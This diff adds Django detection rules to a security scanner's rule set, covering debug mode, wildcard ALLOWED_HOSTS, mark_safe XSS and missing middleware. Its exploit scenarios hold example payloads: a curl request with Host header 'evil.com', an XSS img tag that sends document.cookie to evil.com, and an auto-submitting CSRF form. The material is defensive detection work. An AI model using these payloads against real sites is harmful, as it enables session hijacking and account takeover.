+  bypass_variants:
+  - description: DEBUG from env but always truthy due to string casting
+    pattern: DEBUG\s*=\s*bool\s*\(\s*os\.environ\.get\s*\(\s*["\x27]DEBUG["\x27]\s*,\s*["\x27]False["\x27]\s*\)\s*\)
+  - description: Production settings importing base settings with DEBUG=True
+    pattern: from\s+\.base\s+import\s+\*(?![\s\S]*DEBUG\s*=\s*False)
+  - description: DEBUG controlled by hostname check that can be spoofed
+    pattern: DEBUG\s*=\s*socket\.gethostname\s*\(\s*\)\s*(?:!=|not\s+in)
+  evasion_indicators:
+  - DEBUG set in base settings file and not overridden in production
+  - Environment variable DJANGO_DEBUG set but not correctly parsed as boolean
+  - Debug mode controlled by hostname or IP that can be manipulated
+  encoding_variants:
+  - type: string_bool_bug
+    pattern: DEBUG\s*=\s*bool\s*\(\s*["\x27]False["\x27]\s*\)
+  - type: env_default_truthy
+    pattern: DEBUG\s*=\s*os\.getenv\s*\(\s*["\x27]DEBUG["\x27]\s*,\s*["\x27]true["\x27]\s*\)\s*\.lower\s*\(\s*\)\s*==\s*["\x27]true["\x27]
+  multi_function_chain_patterns:
+  - DEBUG=True -> 404/500 error -> full stack trace with settings exposed
+  - DEBUG=True -> django.db.backends logger -> SQL queries logged with params
+  - DEBUG=True -> INTERNAL_IPS check bypassed -> Django Debug Toolbar exposed
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Debug pages reveal database credentials, SECRET_KEY, and API keys
+  business_logic_indicator:
+    financial_impact: false
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Any HTTP request causing an error (404, 500)
+    sink: Django debug error page with settings and variables
+    through: Django error handler
+  impact: 'With DEBUG=True in production, any unhandled exception displays a
+
+    detailed debug page revealing the full Python traceback, local
+
+    variables (potentially including passwords), Django settings (including
+
+    SECRET_KEY and database credentials), installed applications, and
+
+    middleware stack. The 404 debug page reveals all URL patterns. This
+
+    information enables sophisticated follow-up attacks.
+
+    '
+  remediation: "Ensure DEBUG is False in production:\n\n```python\n# settings/production.py\nimport os\nfrom decouple import\
+    \ config\n\nDEBUG = False  # Always False in production\n\n# Or safely from environment:\nDEBUG = config('DEBUG', default=False,\
+    \ cast=bool)\n\n# Ensure ALLOWED_HOSTS is set (required when DEBUG=False)\nALLOWED_HOSTS = config('ALLOWED_HOSTS', cast=lambda\
+    \ v: [\n    s.strip() for s in v.split(',')\n])\n```\n"
+  references:
+  - https://docs.djangoproject.com/en/stable/ref/settings/#debug
+  - https://docs.djangoproject.com/en/stable/howto/deployment/checklist/
+  - https://cwe.mitre.org/data/definitions/489.html
+  - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+  context_awareness:
+    surrounding_context_patterns:
+    - DJANGO_SETTINGS_MODULE
+    - from\s+django\.
+    - INSTALLED_APPS
+    - MIDDLEWARE
+    taint_source_indicators:
+    - request\.GET
+    - request\.POST
+    - request\.body
+    taint_sink_indicators:
+    - DEBUG\s*=
+    - INTERNAL_IPS
+    sanitization_patterns:
+    - DEBUG\s*=\s*False
+    - decouple\.config.*cast=bool
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: 'severity_weight * confidence * (internet_accessible ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An attacker requests https://target.com/nonexistent-page/ and receives
+
+      Django''s debug 404 page listing all URL patterns. The attacker then
+
+      requests /admin/ with an invalid POST body, triggering a 500 error.
+
+      The debug page reveals the SECRET_KEY, DATABASE_URL with credentials,
+
+      and AWS access keys from Django settings. The attacker uses these
+
+      credentials to access the database and AWS resources directly.
+
+      '
+    example_payload: 'curl -X POST https://target.com/admin/ -d ''invalid'' -H ''Content-Type: application/json'''
+    attacker_objective: Extract sensitive configuration and credentials from Django debug error pages
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: low
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - FW-DJANGO-002
+    - FW-DJANGO-003
+    - FW-FLASK-001
+- rule_id: FW-DJANGO-002
+  title: Django ALLOWED_HOSTS Wildcard Configuration
+  description: 'Detects Django applications with ALLOWED_HOSTS set to a wildcard [''*''] or empty list (with DEBUG=False).
+    The ALLOWED_HOSTS setting validates the Host header to prevent HTTP Host header attacks. A wildcard allows any Host header
+    value, enabling cache poisoning, password reset poisoning, and server-side request routing attacks.
+
+    '
+  language: python
+  category: framework_misuse
+  severity: High
+  confidence: 0.9
+  cwe: CWE-20
+  owasp: A05:2021-Security Misconfiguration
+  tags:
+  - django
+  - allowed-hosts
+  - host-header
+  - cache-poisoning
+  - misconfiguration
+  - python
+  detection_layer: 4
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: ALLOWED_HOSTS\s*=\s*\[\s*["\x27]\*["\x27]\s*\]
+    description: ALLOWED_HOSTS set to wildcard
+  - type: regex
+    pattern: ALLOWED_HOSTS\s*=\s*\[\s*["\x27]\.\*["\x27]\s*\]
+    description: ALLOWED_HOSTS with dot-wildcard
+  - type: regex
+    pattern: ALLOWED_HOSTS\s*=\s*\[\s*\]
+    description: ALLOWED_HOSTS empty list (fails silently with DEBUG=True)
+  - type: regex
+    pattern: ALLOWED_HOSTS\s*=\s*\[\s*["\x27]\*["\x27]\s*,?
+    description: ALLOWED_HOSTS starting with wildcard
+  - type: regex
+    pattern: ALLOWED_HOSTS\.append\s*\(\s*["\x27]\*["\x27]\s*\)
+    description: Wildcard appended to ALLOWED_HOSTS dynamically
+  - type: regex
+    pattern: ALLOWED_HOSTS\s*=\s*os\.environ\.get\s*\([^)]*["\x27]\*["\x27]\s*\)\.split
+    description: ALLOWED_HOSTS from environment with wildcard default
+  anti_patterns:
+  - ALLOWED_HOSTS\s*=\s*\[\s*["\x27][\w.-]+\.[\w]+["\x27]
+  - ALLOWED_HOSTS\s*=\s*\[\s*["\x27]www\.
+  - ALLOWED_HOSTS\s*=\s*\[\s*["\x27]app\.
+  - ALLOWED_HOSTS\s*=\s*\[\s*["\x27]api\.
+  - ALLOWED_HOSTS\s*=\s*config\s*\(
+  - ALLOWED_HOSTS\s*=\s*env\.list\s*\(
+  - ALLOWED_HOSTS\s*=\s*os\.environ\s*\[\s*["\x27]ALLOWED_HOSTS["\x27]\s*\]\.split
+  - ALLOWED_HOSTS\s*=\s*decouple
+  - ALLOWED_HOSTS\s*=\s*\[\s*os\.environ\.get\s*\(\s*["\x27]DOMAIN["\x27]
+  - validate_host\s*\(
+  - CSRF_TRUSTED_ORIGINS\s*=\s*\[
+  - django-hosts
+  - ALLOWED_HOSTS\s*=\s*env\s*\(\s*["\x27]ALLOWED_HOSTS["\x27]
+  - ALLOWED_HOSTS\s*\.extend\s*\(\s*\[(?!\s*["\x27]\*)
+  - allowed_hosts_env
+  bypass_variants:
+  - description: ALLOWED_HOSTS properly set but overridden in local_settings
+    pattern: from\s+\.local_settings\s+import\s+\*
+  - description: Wildcard added conditionally based on environment flag
+    pattern: if\s+os\.environ\.get\s*\(\s*["\x27]ALLOW_ALL_HOSTS["\x27]\s*\)[\s\S]*?ALLOWED_HOSTS.*\*
+  - description: ALLOWED_HOSTS protected but X-Forwarded-Host not validated
+    pattern: USE_X_FORWARDED_HOST\s*=\s*True(?![\s\S]*?SECURE_PROXY_SSL_HEADER)
+  evasion_indicators:
+  - ALLOWED_HOSTS overridden in environment-specific settings files
+  - Reverse proxy passing Host header without validation
+  - USE_X_FORWARDED_HOST=True bypassing ALLOWED_HOSTS check
+  encoding_variants:
+  - type: env_split
+    pattern: ALLOWED_HOSTS\s*=\s*os\.environ\.get\s*\(\s*["\x27]ALLOWED_HOSTS["\x27]\s*,\s*["\x27]\*["\x27]\s*\)\.split\s*\(
+  - type: conditional_wildcard
+    pattern: ALLOWED_HOSTS\s*=\s*\[\s*["\x27]\*["\x27]\s*\]\s*if\s+DEBUG
+  multi_function_chain_patterns:
+  - ALLOWED_HOSTS=['*'] -> Host header injection -> password reset poisoning
+  - ALLOWED_HOSTS=['*'] -> cache key poisoning -> stored XSS via cached response
+  - ALLOWED_HOSTS=['*'] -> Host header -> redirect URL construction -> open redirect
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Host header injection enables password reset poisoning and cache attacks
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: HTTP Host header
+    sink: Django URL generation (request.build_absolute_uri, password reset links)
+    through: ALLOWED_HOSTS validation bypass
+  impact: 'A wildcard ALLOWED_HOSTS setting allows attackers to inject arbitrary
+
+    Host headers. This enables password reset poisoning (reset links sent
+
+    to attacker''s domain), cache poisoning (malicious content cached for
+
+    other users), and SSRF through URL generation functions that trust the
+
+    Host header. Combined with Django''s URL building functions, this can
+
+    redirect users to malicious sites.
+
+    '
+  remediation: "Set ALLOWED_HOSTS to specific, trusted hostnames:\n\n```python\n# settings/production.py\nALLOWED_HOSTS =\
+    \ [\n    'example.com',\n    'www.example.com',\n    'api.example.com',\n]\n\n# Or from environment variable:\nALLOWED_HOSTS\
+    \ = os.environ.get('ALLOWED_HOSTS', '').split(',')\n\n# Never use wildcard in production\n# ALLOWED_HOSTS = ['*']  # NEVER\
+    \ DO THIS\n```\n"
+  references:
+  - https://docs.djangoproject.com/en/stable/ref/settings/#allowed-hosts
+  - https://cwe.mitre.org/data/definitions/20.html
+  - https://docs.djangoproject.com/en/stable/topics/security/#host-headers-virtual-hosting
+  - https://portswigger.net/web-security/host-header
+  context_awareness:
+    surrounding_context_patterns:
+    - ALLOWED_HOSTS
+    - DJANGO_SETTINGS_MODULE
+    - INSTALLED_APPS
+    - settings\.py
+    taint_source_indicators:
+    - request\.get_host\s*\(\s*\)
+    - request\.META\s*\[\s*["\x27]HTTP_HOST["\x27]\s*\]
+    - request\.build_absolute_uri\s*\(
+    taint_sink_indicators:
+    - send_mail\s*\(
+    - reverse\s*\(
+    - redirect\s*\(
+    sanitization_patterns:
+    - ALLOWED_HOSTS\s*=\s*\[\s*["\x27][\w.-]+
+    - validate_host\s*\(
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: 'severity_weight * confidence * (password_reset_feature ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An attacker sends a password reset request to a Django application
+
+      with ALLOWED_HOSTS=[''*''], setting the Host header to evil.com:
+
+      POST /accounts/password/reset/ HTTP/1.1
+
+      Host: evil.com
+
+      Django generates the reset link using the injected Host header.
+
+      The victim receives an email with a reset link pointing to
+
+      https://evil.com/reset/token/. When the victim clicks the link,
+
+      the attacker''s server captures the reset token.
+
+      '
+    example_payload: 'curl -X POST https://target.com/accounts/password/reset/ -H ''Host: evil.com'' -d ''email=victim@example.com'''
+    attacker_objective: Exploit Host header injection for password reset poisoning and cache attacks
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - FW-DJANGO-001
+    - FW-DJANGO-003
+    - FW-DJANGO-004
+- rule_id: FW-DJANGO-003
+  title: Unsafe mark_safe Usage in Django Templates
+  description: 'Detects Django code that uses mark_safe() or the |safe template filter with data that originates from user
+    input, database fields, or external sources without prior sanitization. mark_safe() tells Django''s template engine to
+    skip HTML escaping for the marked string, creating XSS vulnerabilities when applied to untrusted data.
+
+    '
+  language: python
+  category: framework_misuse
+  severity: High
+  confidence: 0.89
+  cwe: CWE-79
+  owasp: A03:2021-Injection
+  tags:
+  - django
+  - xss
+  - mark-safe
+  - template
+  - injection
+  - python
+  detection_layer: 4
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: mark_safe\s*\(\s*f["\x27]
+    description: mark_safe with f-string containing dynamic content
+  - type: regex
+    pattern: mark_safe\s*\(\s*["\x27][^"]*%s
+    description: mark_safe with percent-format string interpolation
+  - type: regex
+    pattern: mark_safe\s*\(\s*["\x27][^"\x27]*\{\s*\}[^"\x27]*["\x27]\.format\s*\(
+    description: mark_safe with .format() string interpolation
+  - type: regex
+    pattern: mark_safe\s*\(\s*\w+\s*\)
+    description: mark_safe wrapping a variable (indirect data)
+  - type: regex
+    pattern: mark_safe\s*\(\s*\w+\s*\+\s*
+    description: mark_safe with string concatenation
+  - type: regex
+    pattern: format_html\s*\(\s*["\x27][^"\x27]*\{\s*\}[^"\x27]*["\x27]\s*,\s*mark_safe
+    description: format_html with mark_safe argument bypassing escaping
+  - type: regex
+    pattern: \|\s*safe\s*\}
+    description: Django template |safe filter usage
+  - type: regex
+    pattern: mark_safe\s*\(\s*request\.
+    description: mark_safe directly wrapping request data
+  anti_patterns:
+  - format_html\s*\(\s*["\x27][^"\x27]*\{\s*\}[^"\x27]*["\x27]\s*,\s*[^m]
+  - mark_safe\s*\(\s*["\x27][^"\x27]+["\x27]\s*\)
+  - bleach\.clean\s*\(
+  - escape\s*\(\s*\w+\s*\)
+  - html\.escape\s*\(
+  - strip_tags\s*\(
+  - mark_safe\s*\(\s*json\.dumps\s*\(
+  - format_html\s*\(
+  - conditional_escape\s*\(
+  - DOMPurify
+  - sanitize\s*\(
+  - clean_html\s*\(
+  - mark_safe\s*\(\s*["\x27]<\w+>static content<\/\w+>["\x27]\s*\)
+  - nh3\.clean\s*\(
+  - lxml\.html\.clean
+  bypass_variants:
+  - description: Data sanitized with incomplete regex before mark_safe
+    pattern: re\.sub\s*\(\s*["\x27]<script[^>]*>["\x27][\s\S]*?mark_safe
+  - description: mark_safe used with strip_tags which is not XSS-safe
+    pattern: mark_safe\s*\(\s*strip_tags\s*\(
+  - description: format_html used but with one argument pre-marked safe
+    pattern: format_html\s*\([^)]*mark_safe\s*\(\s*\w+\s*\)
+  evasion_indicators:
+  - Data passes through multiple function calls before reaching mark_safe
+  - mark_safe applied in template tag that receives context data
+  - Custom template filter using mark_safe on dynamic content
+  encoding_variants:
+  - type: template_filter
+    pattern: '@register\.\w+_tag[\s\S]*?mark_safe\s*\(\s*\w+'
+  - type: model_method
+    pattern: def\s+\w+_html\s*\(self\)[\s\S]*?mark_safe\s*\(\s*f?["\x27]
+  multi_function_chain_patterns:
+  - 'request.GET[''q''] -> mark_safe(f''Search: {q}'') -> template render -> reflected XSS'
+  - model.description -> mark_safe(description) -> template -> stored XSS
+  - form.cleaned_data['bio'] -> user.bio = bio -> mark_safe(user.bio) -> stored XSS
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: XSS via mark_safe enables session hijacking and account takeover
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: User input (request.GET, request.POST, form data)
+    sink: mark_safe() or |safe template filter
+    through: View function, model field, or template context
+  impact: 'Using mark_safe() with unsanitized user data creates cross-site
+
+    scripting vulnerabilities. Django''s auto-escaping is the primary
+
+    defense against XSS, and mark_safe explicitly bypasses it. Attackers
+
+    can inject arbitrary HTML and JavaScript that execute in victims''
+
+    browsers, enabling session theft, account takeover, and data exfiltration.
+
+    '
+  remediation: "Use format_html() instead of mark_safe() for dynamic content:\n\n```python\nfrom django.utils.html import\
+    \ format_html, escape\n\n# BAD - XSS vulnerable\n# return mark_safe(f'<a href=\"{url}\">{name}</a>')\n\n# GOOD - auto-escapes\
+    \ arguments\nreturn format_html('<a href=\"{}\">{}</a>', url, name)\n\n# For rich text from users, use a sanitization\
+    \ library:\nimport nh3\nclean_html = nh3.clean(\n    user_html,\n    tags={'b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul',\
+    \ 'li'},\n    attributes={'a': {'href', 'title'}},\n)\nreturn mark_safe(clean_html)\n```\n"
+  references:
+  - https://docs.djangoproject.com/en/stable/ref/utils/#django.utils.safestring.mark_safe
+  - https://docs.djangoproject.com/en/stable/ref/utils/#django.utils.html.format_html
+  - https://cwe.mitre.org/data/definitions/79.html
+  - https://owasp.org/Top10/A03_2021-Injection/
+  context_awareness:
+    surrounding_context_patterns:
+    - from\s+django\.utils\.safestring\s+import\s+mark_safe
+    - mark_safe\s*\(
+    - \|\s*safe
+    - format_html\s*\(
+    taint_source_indicators:
+    - request\.GET
+    - request\.POST
+    - form\.cleaned_data
+    - self\.\w+
+    taint_sink_indicators:
+    - mark_safe\s*\(
+    - \|\s*safe
+    - SafeString\s*\(
+    sanitization_patterns:
+    - format_html\s*\(
+    - bleach\.clean\s*\(
+    - nh3\.clean\s*\(
+    - escape\s*\(
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: 'severity_weight * confidence * (stored_xss ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Django admin panel displays user-submitted profile bios using
+
+      mark_safe(user.bio) in a custom admin widget. An attacker sets their
+
+      bio to: <img src=x onerror="fetch(''https://evil.com/steal?c=''+document.cookie)">
+
+      When an admin views the user list, the XSS payload fires, stealing
+
+      the admin''s session cookie. The attacker uses this to access the
+
+      Django admin panel with full administrative privileges.
+
+      '
+    example_payload: <img src=x onerror="new Image().src=`https://evil.com/steal?c=${document.cookie}`">
+    attacker_objective: Inject persistent XSS through mark_safe to hijack admin sessions
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - FW-DJANGO-001
+    - FW-NEXT-004
+    - FW-SYMFONY-003
+- rule_id: FW-DJANGO-004
+  title: Missing Security Middleware in Django Settings
+  description: 'Detects Django applications that are missing critical security middleware from the MIDDLEWARE setting. Django
+    provides built-in middleware for CSRF protection, clickjacking prevention, XSS filtering, HTTPS enforcement, and HSTS.
+    Omitting these middleware components leaves the application vulnerable to common web attacks that Django is designed to
+    prevent.
+
+    '
+  language: python
+  category: framework_misuse
+  severity: High
+  confidence: 0.86
+  cwe: CWE-693
+  owasp: A05:2021-Security Misconfiguration
+  tags:
+  - django
+  - middleware
+  - csrf
+  - security-headers
+  - misconfiguration
+  - python
+  detection_layer: 4
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: MIDDLEWARE\s*=\s*\[(?![\s\S]*?SecurityMiddleware)
+    description: MIDDLEWARE list missing SecurityMiddleware
+  - type: regex
+    pattern: MIDDLEWARE\s*=\s*\[(?![\s\S]*?CsrfViewMiddleware)
+    description: MIDDLEWARE list missing CsrfViewMiddleware
+  - type: regex
+    pattern: MIDDLEWARE\s*=\s*\[(?![\s\S]*?XFrameOptionsMiddleware)
+    description: MIDDLEWARE list missing XFrameOptionsMiddleware
+  - type: regex
+    pattern: '@csrf_exempt'
+    description: CSRF protection explicitly disabled on a view
+  - type: regex
+    pattern: CSRF_COOKIE_SECURE\s*=\s*False
+    description: CSRF cookie sent over insecure connections
+  - type: regex
+    pattern: SESSION_COOKIE_SECURE\s*=\s*False
+    description: Session cookie sent over insecure connections
+  - type: regex
+    pattern: SECURE_SSL_REDIRECT\s*=\s*False
+    description: HTTPS redirect disabled
+  - type: regex
+    pattern: SECURE_HSTS_SECONDS\s*=\s*0
+    description: HSTS disabled
+  anti_patterns:
+  - django\.middleware\.security\.SecurityMiddleware
+  - django\.middleware\.csrf\.CsrfViewMiddleware
+  - django\.middleware\.clickjacking\.XFrameOptionsMiddleware
+  - CSRF_COOKIE_SECURE\s*=\s*True
+  - SESSION_COOKIE_SECURE\s*=\s*True
+  - SECURE_SSL_REDIRECT\s*=\s*True
+  - SECURE_HSTS_SECONDS\s*=\s*31536000
+  - SECURE_CONTENT_TYPE_NOSNIFF\s*=\s*True
+  - SECURE_BROWSER_XSS_FILTER\s*=\s*True
+  - X_FRAME_OPTIONS\s*=\s*["\x27]DENY["\x27]
+  - SECURE_REFERRER_POLICY
+  - CSP_DEFAULT_SRC
+  - django-csp
+  - SECURE_HSTS_INCLUDE_SUBDOMAINS\s*=\s*True
+  - SESSION_COOKIE_HTTPONLY\s*=\s*True
+  bypass_variants:
+  - description: CSRF middleware present but @csrf_exempt used extensively
+    pattern: '@csrf_exempt[\s\S]*?def\s+\w+\s*\(\s*request'
+  - description: SecurityMiddleware present but all features disabled
+    pattern: SecurityMiddleware[\s\S]*?SECURE_SSL_REDIRECT\s*=\s*False[\s\S]*?SECURE_HSTS_SECONDS\s*=\s*0
+  - description: Middleware present but order is incorrect
+    pattern: CsrfViewMiddleware[\s\S]*?SessionMiddleware
+  evasion_indicators:
+  - Security middleware conditionally included based on environment
+  - Custom middleware replacing Django security middleware without full coverage
+  - MIDDLEWARE setting dynamically modified at runtime
+  encoding_variants:
+  - type: dynamic_middleware
+    pattern: MIDDLEWARE\s*=\s*\[\s*\][\s\S]*?MIDDLEWARE\.\w+\s*\(
+  - type: conditional_removal
+    pattern: MIDDLEWARE\.remove\s*\(\s*["\x27]django\.middleware\.(csrf|security)
+  multi_function_chain_patterns:
+  - Missing CsrfViewMiddleware -> CSRF attack on state-changing endpoints
+  - Missing SecurityMiddleware -> no HSTS -> protocol downgrade attack
+  - Missing XFrameOptionsMiddleware -> clickjacking on sensitive pages
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Missing security middleware exposes all users to CSRF, clickjacking, and downgrade attacks
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Cross-origin form submission (CSRF)
+    sink: State-changing Django view
+    through: Missing CsrfViewMiddleware
+  impact: 'Missing Django security middleware exposes the application to multiple
+
+    attack vectors. Without CsrfViewMiddleware, all POST endpoints are
+
+    vulnerable to cross-site request forgery. Without SecurityMiddleware,
+
+    HSTS and HTTPS redirect are disabled. Without XFrameOptionsMiddleware,
+
+    pages can be embedded in iframes for clickjacking attacks. These are
+
+    foundational protections that Django provides by default.
+
+    '
+  remediation: "Ensure all security middleware is properly configured:\n\n```python\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n\
+    \    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n\
+    \    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n\
+    \    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\n# Security settings\nSECURE_SSL_REDIRECT = True\n\
+    SECURE_HSTS_SECONDS = 31536000\nSECURE_HSTS_INCLUDE_SUBDOMAINS = True\nSECURE_HSTS_PRELOAD = True\nSECURE_CONTENT_TYPE_NOSNIFF\
+    \ = True\nSESSION_COOKIE_SECURE = True\nCSRF_COOKIE_SECURE = True\nSESSION_COOKIE_HTTPONLY = True\nX_FRAME_OPTIONS = 'DENY'\n\
+    ```\n"
+  references:
+  - https://docs.djangoproject.com/en/stable/ref/middleware/#module-django.middleware.security
+  - https://docs.djangoproject.com/en/stable/howto/deployment/checklist/
+  - https://cwe.mitre.org/data/definitions/693.html
+  - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+  context_awareness:
+    surrounding_context_patterns:
+    - MIDDLEWARE\s*=
+    - INSTALLED_APPS
+    - TEMPLATES
+    - DATABASES
+    taint_source_indicators:
+    - request\.POST
+    - request\.body
+    taint_sink_indicators:
+    - \.save\s*\(
+    - \.delete\s*\(
+    - \.update\s*\(
+    sanitization_patterns:
+    - CsrfViewMiddleware
+    - SecurityMiddleware
+    - XFrameOptionsMiddleware
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: 'severity_weight * confidence * (missing_csrf ? 1.5 : 1.0)'
+    exploitability_score: Medium
+  exploit_scenario:
+    attack_example: 'A Django application is missing CsrfViewMiddleware. An attacker creates
+
+      a malicious page with a hidden form that submits a POST request to the
+
+      Django app''s /account/transfer/ endpoint. When an authenticated user
+
+      visits the malicious page, the form auto-submits, transferring funds
+
+      from the victim''s account. Without CSRF protection, the request
+
+      succeeds because the browser includes the session cookie automatically.
+
+      '
+    example_payload: <form action="https://target.com/account/transfer/" method="POST"><input type="hidden" name="to" value="attacker"/><input
+      type="hidden" name="amount" value="10000"/></form><script>document.forms[0].submit()</script>
+    attacker_objective: Exploit missing security middleware for CSRF, clickjacking, and protocol downgrade attacks
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - FW-DJANGO-001
+    - FW-DJANGO-002
+    - FW-EXPRESS-001
